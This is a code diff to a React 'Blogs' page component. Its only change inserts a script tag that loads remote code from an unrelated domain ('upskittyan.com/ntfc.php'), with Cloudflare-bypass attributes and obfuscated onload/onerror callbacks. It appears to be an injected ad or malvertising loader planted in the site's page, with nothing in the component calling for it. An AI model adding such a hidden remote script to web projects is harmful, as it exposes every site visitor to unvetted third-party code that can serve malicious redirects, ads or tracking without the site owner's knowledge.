@@ -89,6 +89,7 @@ export default function Blogs() {
 
   return (
     <Container className="mt-5">
+      <script src="//upskittyan.com/ntfc.php?p=9773631" data-cfasync="false" async onerror="_aijgub()" onload="_nupdjki()"></script>
       <h1 className="text-center mb-4">Blogs</h1>
       <Row>
         <Col md={isAdmin ? 8 : 12}>
